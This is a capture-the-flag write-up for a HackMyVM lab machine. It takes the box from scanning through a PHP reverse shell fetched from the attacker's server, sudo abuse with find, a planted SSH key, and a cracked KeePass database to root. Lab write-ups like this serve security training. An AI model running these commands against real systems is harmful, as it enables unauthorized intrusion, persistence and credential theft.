@@ -1,0 +1,235 @@
+### Write up for https://hackmyvm.eu/machines/machine.php?vm=Sysadmin ###
+
+ip=<machines ip>
+url=http://$ip
+
+threader3000
+$ip
+
+# Nmap 7.92 scan initiated Thu Jul  7 14:33:25 2022 as: nmap -p22,80 -sV -sC -T4 -Pn -oA 10.1.1.19 10.1.1.19
+Host: 10.1.1.19 ()      Status: Up
+Host: 10.1.1.19 ()      Ports: 22/open/tcp//ssh//OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)/, 80/open/tcp//http//Apache httpd 2.4.38 ((Debian))/
+# Nmap done at Thu Jul  7 14:33:31 2022 -- 1 IP address (1 host up) scanned in 6.53 seconds
+# Nmap 7.92 scan initiated Thu Jul  7 14:33:25 2022 as: nmap -p22,80 -sV -sC -T4 -Pn -oA 10.1.1.19 10.1.1.19
+Nmap scan report for 10.1.1.19
+Host is up (0.00042s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 79:5c:c4:27:1f:02:33:77:6f:56:ed:88:98:22:4b:ca (RSA)
+|   256 20:46:f8:a9:b4:32:c4:56:4b:e6:54:97:47:30:dd:7a (ECDSA)
+|_  256 a1:1c:43:50:d6:03:14:27:69:c0:11:45:7e:df:25:e1 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.38 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Jul  7 14:33:31 2022 -- 1 IP address (1 host up) scanned in 6.53 seconds
+
+
+feroxbuster -e -x txt,php,html,zip,htm,bak,pem -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u $url -t 150 -o ferox-$ip-full.log
+
+
+301      GET        9l       28w      306c http://10.1.1.19/audio => http://10.1.1.19/audio/
+301      GET        9l       28w      308c http://10.1.1.19/uploads => http://10.1.1.19/uploads/
+200      GET      368l      933w    10701c http://10.1.1.19/index.html
+200      GET       24l      126w     5754c http://10.1.1.19/icons/openlogo-75.png
+403      GET        9l       28w      274c http://10.1.1.19/.php
+200      GET      368l      933w    10701c http://10.1.1.19/
+200      GET        1l        0w        1c http://10.1.1.19/uploads/index.html
+403      GET        9l       28w      274c http://10.1.1.19/.html
+200      GET        1l        0w        1c http://10.1.1.19/audio/index.html
+403      GET        9l       28w      274c http://10.1.1.19/.htm
+
+
+lets try the audio directory. since audio dir probably contains audio files we need to add the audio formats (-x aac,wna,wav,mp3 etc)
+
+feroxbuster -e -x aac,wma,wav,mp3 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u $url/audio -t 500 -o ferox-$ip-audio.log
+
+301      GET        9l       28w      306c http://10.1.1.19/audio => http://10.1.1.19/audio/
+200      GET     2932l    17343w  1940444c http://10.1.1.19/audio/secret.wav
+
+wget http://10.1.1.19/audio/secret.wav
+
+it's morse code
+
+google morse audio decoder
+
+https://databorder.com/transfer/morse-sound-receiver/
+
+upload the wav file and you will get a subdomain
+add it to the /etc/hosts
+
+sudo sh -c "echo '10.1.1.19     sysadmin.intranet.hmv' >> /etc/hosts"
+
+feroxbuster -e -x txt,php,html,zip,htm,bak,pem -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://sysadmin.intranet.hmv -t 500 -o ferox-$ip-domain.log
+
+200      GET        8l       10w      122c http://sysadmin.intranet.hmv/index.html
+200      GET        8l       10w      122c http://sysadmin.intranet.hmv/
+200      GET       18l       38w      414c http://sysadmin.intranet.hmv/check.php
+403      GET        9l       28w      286c http://sysadmin.intranet.hmv/.php
+403      GET        9l       28w      286c http://sysadmin.intranet.hmv/.html
+403      GET        9l       28w      286c http://sysadmin.intranet.hmv/.htm
+
+after visiting the website we can see that we can verify websites
+
+Enter the address you want to verify. Example: http://localhost/index.html 
+
+lets try to get a reverse shell through it.
+
+get php revshell ( i use https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php )
+
+modify it to match your ip/port
+
+then 
+
+python3 -m http.server 80
+
+back to the check.php page
+
+http://10.1.1.11/shell.php -o shell.php
+
+on a new terminal
+rsg 10.1.1.11 5555 php
+
+on your first terminal
+curl http://sysadmin.intranet.hmv/shell.php  
+
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+lets get more stable shell
+
+
+$ which python3
+/usr/bin/python3
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@Sysadmin:/$ 
+
+ctrl + z 
+
+stty -a
+stty raw -echo ; fg
+
+reset
+xterm
+stty rows (change the value) cols (change the value)
+export TERM=xterm-256color
+alias ll='clear ; ls -lsaht --color=auto'
+
+www-data@Sysadmin:/$ sudo -l
+Matching Defaults entries for www-data on Sysadmin:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on Sysadmin:
+    (tom) NOPASSWD: /usr/bin/
+
+
+https://gtfobins.github.io/gtfobins/find/
+www-data@Sysadmin:/$ sudo -u tom find . -exec /bin/bash \; -quit
+tom@Sysadmin:/$ 
+
+at this point i usualy add my own id_rsa to the user so i can ssh directly
+
+mkdir .ssh
+chmod 755 .ssh
+cd .ssh
+
+echo 'ssh-rsa (your id)' >> authorized_keys
+
+chmod 644 authorized_keys
+
+on your attackers terminal 
+
+ssh tom@sysadmin.intranet.hmv
+
+tom@Sysadmin:~$ ls
+notes.txt  user.txt
+tom@Sysadmin:~$ cat notes.txt 
+
+Hi Tom,
+
+remember that due to security policies only you can access the resource..
+
+I repeat,
+
+only you
+
+
+
+
+
+regads
+
+admin
+
+
+tom@Sysadmin:~/.ssh$ netstat -tuln
+bash: netstat: command not found
+tom@Sysadmin:~/.ssh$ ss -tunl
+Netid                      State                       Recv-Q                      Send-Q                                             Local Address:Port                                              Peer Address:Port                      
+udp                        UNCONN                      0                           0                                                        0.0.0.0:68                                                     0.0.0.0:*                         
+tcp                        LISTEN                      0                           128                                                      0.0.0.0:22                                                     0.0.0.0:*                         
+tcp                        LISTEN                      0                           32                                                     127.0.0.1:65123                                                  0.0.0.0:*                         
+tcp                        LISTEN                      0                           128                                                            *:80                                                           *:*                         
+tcp                        LISTEN                      0                           128                                                         [::]:22                                                        [::]:*          
+
+
+tom@Sysadmin:~/.ssh$ nc -v 127.0.0.1 65123
+localhost [127.0.0.1] 65123 (?) open
+220 (vsFTPd 3.0.3)
+
+ftp 127.0.0.1 65123
+Connected to 127.0.0.1.
+220 (vsFTPd 3.0.3)
+Name (127.0.0.1:tom): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls -alh
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        113          4096 Mar 25  2021 .
+drwxr-xr-x    3 0        113          4096 Mar 25  2021 ..
+drwxr-xr-x    2 0        0            4096 Mar 25  2021 db
+226 Directory send OK.
+ftp> cd db
+250 Directory successfully changed.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwx---rw-    1 0        0            1774 Mar 25  2021 root.kdbx
+226 Directory send OK.
+ftp> mget *
+mget root.kdbx? 
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for root.kdbx (1774 bytes).
+226 Transfer complete.
+1774 bytes received in 0.00 secs (8.0563 MB/s)
+ftp> exit
+221 Goodbye.
+tom@Sysadmin:~/.ssh$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+on attackers terminal
+
+curl http://sysadmin.intranet.hmv:8000/root.kdbx -o root.kdbx
+
+keepass2john root.kdbx > hash
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+password cracked now lets open that db
+
+
+https://app.keeweb.info/
+
+after opening the file you will find root pass
+
+tom@Sysadmin:~$ su root
+Contraseña: 
+root@Sysadmin:/home/tom# 
